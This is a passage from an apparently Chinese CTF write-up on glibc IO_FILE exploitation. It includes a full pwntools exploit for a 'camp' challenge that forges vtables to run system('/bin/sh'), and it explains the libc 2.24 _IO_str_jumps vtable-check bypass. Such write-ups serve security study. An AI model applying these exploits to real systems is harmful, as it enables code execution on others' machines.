operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token function">MIN</span> <span class="token punctuation">(</span>INT_MAX<span class="token punctuation">,</span> len <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_IO_release_lock</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>其中调用了<code>_IO_sputn</code>，第一个参数为<code>_IO_stdout</code>，找到<code>_IO_stdout</code>定义如下</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> _IO_stdout ((_IO_FILE*)(&amp;_IO_2_1_stdout_))</span></code></pre><p>所以，第一个参数就为<code>_IO_2_1_stdout_</code>结构体，如果我们能将vtable中的<code>_IO_sputn</code>覆盖成system函数，将<code>_IO_2_1_stdout_</code>结构体的<code>_flags</code>覆盖成/bin/sh，这样就能调用system(“/bin/sh”)</p><p>完整exp如下</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./camp'</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'camp'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">stdout</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">stdin</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">stderr</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#修改_IO_2_1_stdout_结构体，泄露libc地址</span>stdout<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c36e0</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>_IO_2_1_stderr_ <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stderr_'</span><span class="token punctuation">]</span>_IO_2_1_stdin_<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>_IO_2_1_stdout_<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stderr_ => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>_IO_2_1_stderr_<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stdin_ => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>_IO_2_1_stdin_<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stdout_ => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>_IO_2_1_stdout_<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将stderr结构体伪造成vtable，前7个函数全部置0，第八个，也就是_IO_xsputn函数设置为system</span>stderr<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x3c56a3</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x3c56a4</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>_IO_2_1_stdin_<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xa000000</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x3c6780</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x3c47a0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x00000000ffffffff</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>_IO_2_1_stderr_<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#完整地将stdout结构体重新设置，除了_flags设置为/bin/sh以及将vtable设置为stderr结构体的地址以外，其他的都不变，这样的话当执行printf时，会通过我们伪造的vtable指针找到sterr结构体来调用_IO_xsputn,实际上调用的是system函数，而stdout开头的值我们已经设置为了binsh，这样就能执行system("/bin/sh")了(因为要将stdout结构体全部设置，所以就不用IO_FILE结构体伪造模块了，那样会更加麻烦一些，毕竟有那么多的成员)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>stdout<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>泄露libc地址</p><p><img src="/LawlietLW.github.io/2020/08/08/io-file-xue-xi/3.jpg" alt></p><p>修改前的stdout</p><p><img src="/LawlietLW.github.io/2020/08/08/io-file-xue-xi/4.jpg" alt></p><p>修改后的stdout</p><p><img src="/LawlietLW.github.io/2020/08/08/io-file-xue-xi/5.jpg" alt></p><p><img src="/LawlietLW.github.io/2020/08/08/io-file-xue-xi/6.jpg" alt></p><p>修改后的stderr</p><p><img src="/LawlietLW.github.io/2020/08/08/io-file-xue-xi/7.jpg" alt></p><p>这题除了用2.23下的做法以外还可以用2.24下的做法，之后会用2.24下的做法进行利用,也就是_IO_str_jumps(听说比赛的时候给的是2.23的libc，远程是2.24的，太屑了)</p><p>接下来进入高版本libc下IO_FILE的利用方法，也就是libc&gt;=2.24</p><p>相对于libc2.23以下的版本，2.24对vtable的位置进行了检查，检查内容如下</p><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> _IO_jump_t <span class="token operator">*</span><span class="token function">IO_validate_vtable</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">struct</span> _IO_jump_t <span class="token operator">*</span>vtable<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">/* Fast path: The vtable pointer is within the __libc_IO_vtables     section.  */</span>  uintptr_t section_length <span class="token operator">=</span> __stop___libc_IO_vtables <span class="token operator">-</span> __start___libc_IO_vtables<span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> vtable<span class="token punctuation">;</span>  uintptr_t offset <span class="token operator">=</span> ptr <span class="token operator">-</span> __start___libc_IO_vtables<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>offset <span class="token operator">>=</span> section_length<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">/* The vtable pointer is not in the expected section.  Use the       slow path, which will terminate the process if necessary.  */</span>    <span class="token function">_IO_vtable_check</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> vtable<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>如果vtable的地址不在<code>__start___libc_IO_vtables</code>和<code>__stop___libc_IO_vtables</code>之间的话，就会调用<code>_IO_vtable_check</code>函数，<code>_IO_vtable_check</code>函数如下</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> attribute_hidden<span class="token function">_IO_vtable_check</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token macro property">#<span class="token directive keyword">ifdef</span> SHARED</span>  <span class="token comment" spellcheck="true">/* Honor the compatibility flag.  */</span>  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>flag<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">atomic_load_relaxed</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>IO_accept_foreign_vtables<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">ifdef</span> PTR_DEMANGLE</span>  <span class="token function">PTR_DEMANGLE</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token operator">&amp;</span>_IO_vtable_check<span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* In case this libc copy is in a non-default namespace, we always     need to accept foreign vtables because there is always a     possibility that FILE * objects are passed across the linking     boundary.  */</span>  <span class="token punctuation">{</span>    Dl_info di<span class="token punctuation">;</span>    <span class="token keyword">struct</span> link_map <span class="token operator">*</span>l<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>_dl_open_hook <span class="token operator">!=</span> <span class="token constant">NULL</span>        <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">_dl_addr</span> <span class="token punctuation">(</span>_IO_vtable_check<span class="token punctuation">,</span> <span class="token operator">&amp;</span>di<span class="token punctuation">,</span> <span class="token operator">&amp;</span>l<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span>            <span class="token operator">&amp;&amp;</span> l<span class="token operator">-></span>l_ns <span class="token operator">!=</span> LM_ID_BASE<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token macro property">#<span class="token directive keyword">else</span> </span><span class="token comment" spellcheck="true">/* !SHARED */</span>  <span class="token comment" spellcheck="true">/* We cannot perform vtable validation in the static dlopen case     because FILE * handles might be passed back and forth across the     boundary.  Therefore, we disable checking in this case.  */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>__dlopen <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>  <span class="token function">__libc_fatal</span> <span class="token punctuation">(</span><span class="token string">"Fatal error: glibc detected an invalid stdio handle\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><code>_IO_vtable_check</code>函数会检查vtable是否是外部的合法vtable，如果不是则抛出错误</p><p>vtable的起始<code>__start___libc_IO_vtables</code>的地址为</p><pre class=" language-shell"><code class="language-shell">pwndbg> p &__start___libc_IO_vtables$1 = (const char (*)[]) 0x7ffff7dce8c0 <_IO_helper_jumps></code></pre><p>vtable的结束<code>__stop___libc_IO_vtables</code>的地址为</p><pre class=" language-shell"><code class="language-shell">pwndbg> p &__stop___libc_IO_vtables$2 = (const char (*)[]) 0x7ffff7dcf628</code></pre><p>我们在house of orange中将vtable伪造在了堆中，在camp中将vtable伪造在了<code>_IO_2_1_stderr_</code>中，2.24下首先检查vtable是否在<code>__start___libc_IO_vtables</code>和<code>__stop___libc_IO_vtables</code>之间，如果不是则检查是否是合法外部vtable，如果依然不是则抛出错误，2.23下的伪造方式显然不能通过2.24的检查。</p><p>根据大佬们的说法，可以利用<code>_IO_str_jumps</code>这个vtable，vtable如下</p><pre class=" language-c"><code class="language-c">pwndbg<span class="token operator">></span> p _IO_str_jumps $<span class="token number">19</span> <span class="token operator">=</span> <span class="token punctuation">{</span>  __dummy <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>   __dummy2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>   __finish <span class="token operator">=</span> <span class="token number">0x7ffff7a906b0</span> <span class="token operator">&lt;</span>_IO_str_finish<span class="token operator">></span><span class="token punctuation">,</span>   __overflow <span class="token operator">=</span> <span class="token number">0x7ffff7a90310</span> <span class="token operator">&lt;</span>__GI__IO_str_overflow<span class="token operator">></span><span class="token punctuation">,</span>   __underflow <span class="token operator">=</span> <span class="token number">0x7ffff7a902b0</span> <span class="token operator">&lt;</span>__GI__IO_str_underflow<span class="token operator">></span><span class="token punctuation">,</span>   __uflow <span class="token operator">=</span> <span class="token number">0x7ffff7a8e900</span> <span class="token operator">&lt;</span>__GI__IO_default_uflow<span class="token operator">></span><span class="token punctuation">,</span>   __pbackfail <span class="token operator">=</span> <span class="token number">0x7ffff7a90690</span> <span class="token operator">&lt;</span>__GI__IO_str_pbackfail<span class="token operator">></span><span class="token punctuation">,</span>   __xsputn <span class="token operator">=</span> <span class="token number">0x7ffff7a8e960</span> <span class="token operator">&lt;</span>__GI__IO_default_xsputn<span class="token operator">></span><span class="token punctuation">,</span>   __xsgetn <span class="token operator">=</span> <span class="token number">0x7ffff7a8eaf0</span> <span class="token operator">&lt;</span>__GI__IO_default_xsgetn<span class="token operator">></span><span class="token punctuation">,</span>   __seekoff <span class="token operator">=</span> <span class="token number">0x7ffff7a907e0</span> <span class="token operator">&lt;</span>__GI__IO_str_seekoff<span class="token operator">></span><span class="token punctuation">,</span>   __seekpos <span class="token operator">=</span> <span class="token number">0x7ffff7a8eea0</span> <span class="token operator">&lt;</span>_IO_default_seekpos<span class="token operator">></span><span class="token punctuation">,</span>   __setbuf <span class="token operator">=</span> <span class="token number">0x7ffff7a8ed70</span> <span class="token operator">&lt;</span>_IO_default_setbuf<span class="token operator">></span><span class="token punctuation">,</span>   __sync <span class="token operator">=</span> <span class="token number">0x7ffff7a8f120</span> <span class="token operator">&lt;</span>_IO_default_sync<span class="token operator">></span><span class="token punctuation">,</span>   __doallocate <span class="token operator">=</span> <span class="token number">0x7ffff7a8ef10</span> <span class="token operator">&lt;</span>__GI__IO_default_doallocate<span class="token operator">></span><span class="token punctuation">,</span>   __read <span class="token operator">=</span> <span class="token number">0x7ffff7a90160</span> <span class="token operator">&lt;</span>_IO_default_read<span class="token operator">></span><span class="token punctuation">,</span>   __write <span class="token operator">=</span> <span class="token number">0x7ffff7a90170</span> <span class="token operator">&lt;</span>_IO_default_write<span class="token operator">></span><span class="token punctuation">,</span>   __seek <span class="token operator">=</span> <span class="token number">0x7ffff7a90140</span> <span class="token operator">&lt;</span>_IO_default_seek<span class="token operator">></span><span class="token punctuation">,</span>   __close <span class="token operator">=</span> <span class="token number">0x7ffff7a8f120</span> <span class="token operator">&lt;</span>_IO_default_sync<span class="token operator">></span><span class="token punctuation">,</span>   __stat <span class="token operator">=</span> <span class="token number">0x7ffff7a90150</span> <span class="token operator">&lt;</span>_IO_default_stat<span class="token operator">></span><span class="token punctuation">,</span>   __showmanyc <span class="token operator">=</span> <span class="token number">0x7ffff7a90180</span> <span class="token operator">&lt;</span>_IO_default_showmanyc<span class="token operator">></span><span class="token punctuation">,</span>   __imbue <span class="token operator">=</span> <span class="token number">0x7ffff7a90190</span> <span class="token operator">&lt;</span>_IO_default_imbue<span class="token operator">></span><span class="token punctuation">}</span></code></pre><p>这个vtable中的<code>_IO_str_finish</code>和<code>_IO_str_overflow</code>函数存在相对地址调用，首先看到<code>_IO_str_finish</code>，源码如下</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span><span class="token function">_IO_str_finish</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">int</span> dummy<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_buf_base <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_USER_BUF<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_IO_strfile <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token punctuation">)</span><span class="token operator">-></span>_s<span class="token punctuation">.</span>_free_buffer<span class="token punctuation">)</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span>  fp<span class="token operator">-></span>_IO_buf_base <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token function">_IO_default_finish</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>当满足如下条件时</p><pre class=" language-c"><code class="language-c"><span class="token number">1</span><span class="token punctuation">.</span>fp<span class="token operator">-></span>_IO_buf_base<span class="token number">2</span><span class="token punctuation">.</span><span class="token operator">!</span><span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_USER_BUF<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//_flags&amp;_IO_USER_BUF要为0，而#define _IO_USER_BUF 1，所以_flags的最后一位要为0</span></code></pre><p>便会调用<code>(((_IO_strfile *) fp)-&gt;_s._free_buffer)</code>，参数为<code>fp-&gt;_IO_buf_base</code>，我们可以将<code>fp-&gt;_s._free_buffer</code>伪造为system函数，将<code>fp-&gt;_IO_buf_base</code>设置为/bin/sh，那么<code>fp-&gt;_s._free_buffer</code>的偏移为多少，我们在gdb中使用如下命令查看</p><pre class=" language-shell"><code class="language-shell">pwndbg> p/x &((_IO_strfile *) stdout)->_s._free_buffer$14 = 0x7ffff7dd36e8pwndbg> p &_IO_2_1_stdout_ $15 = (struct _IO_FILE_plus *) 0x7ffff7dd3600 <_IO_2_1_stdout_>pwndbg> p/x 0x7ffff7dd36e8-0x7ffff7dd3600$16 = 0xe8</code></pre><p>可以得到<code>_s._free_buffer</code>相对于<code>IO_FILE</code>结构体的偏移为<code>0xe8</code>,类似的，用这几条命令查看_s._free_buffer相对于stdin和stderr的偏移也为0xe8</p><p>那么，该如何触发<code>fp-&gt;_s._free_buffer</code>？在house of orange的利用中，我们通过触发<code>_IO_flush_all_lockp</code>，并设置好IO_FILE中一些成员的值来满足约束，调用<code>_IO_OVERFLOW</code>函数，而<code>_IO_OVERFLOW</code>在vtable中的偏移为0x18，<code>_IO_finish</code>的偏移为0x10，在<code>_IO_str_jumps</code>中<code>_IO_str_finish</code>的偏移也为0x10，于是我们将vtable指向<code>_IO_str_jumps-8</code>，这样当调用<code>_IO_OVERFLOW</code>函数时实际上就是调用了<code>_IO_str_jumps</code>中的<code>_IO_str_finish</code>函数，在构造触发<code>_IO_OVERFLOW</code>的条件的同时，我们将<code>_IO_buf_base</code>设置为/bin/sh，将fp+0xe8设置为system。总结一下构造的条件如下</p><pre class=" language-c"><code class="language-c">fp<span class="token operator">-></span>_flags<span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">==</span><span class="token number">0</span>fp<span class="token operator">-></span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span> fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">></span> fp<span class="token operator">-></span>_IO_write_basefp<span class="token operator">-></span>_IO_buf_base<span class="token operator">=</span>binshfp<span class="token operator">-></span>vtable<span class="token operator">=</span>_IO_str_jumps<span class="token number">-8</span>fp<span class="token operator">+</span><span class="token number">0xe8</span><span class="token operator">=</span>system</code></pre><p>接下来我们用2.24下的做法来解决house of orange和camp这两道题，并且增加另外几道例题</p><p>house of orange的IO_FILE修改为如下</p><pre class=" language-python"><code class="language-python">pay <span class="token operator">=</span> <span class="token string">'e'</span><span class="token operator">*</span><span class="token number">0x400</span>pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>pay <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x1f</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>fake_file <span class="token operator">=</span> IO_FILE_plus<span class="token punctuation">(</span><span class="token punctuation">)</span>fake_file<span class="token punctuation">.</span>_flags <span class="token operator">=</span> <span class="token number">0</span>fake_file<span class="token punctuation">.</span>_IO_read_ptr <span class="token operator">=</span> <span class="token number">0x61</span>fake_file<span class="token punctuation">.</span>_IO_read_base<span class="token operator">=</span>_IO_list_all<span class="token number">-0x10</span>fake_file<span class="token punctuation">.</span>_IO_buf_base<span class="token operator">=</span>binsh_addrfake_file<span class="token punctuation">.</span>_IO_write_base<span class="token operator">=</span><span class="token number">0</span>fake_file<span class="token punctuation">.</span>_IO_write_ptr<span class="token operator">=</span><span class="token number">1</span>fake_file<span class="token punctuation">.</span>_mode<span class="token operator">=</span><span class="token number">0</span>fake_file<span class="token punctuation">.</span>vtable<span class="token operator">=</span>_IO_str_jumps<span class="token number">-8</span>pay <span class="token operator">+=</span> str<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span></code></pre><p>伪造的IO_FILE按照上面所说的条件进行构造，但并不是百分百的成功率，原因可以看这位师傅写的<a href="https://www.anquanke.com/post/id/168802" target="_blank" rel="noopener">新手向——IO_file全流程浅析</a></p><p>再看到camp的在2.24下的用法</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> pwn_debug <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./camp'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'camp'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/usr/lib/freelibs/amd64/2.24-3ubuntu1_amd64/libc-2.24.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">stdout</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token 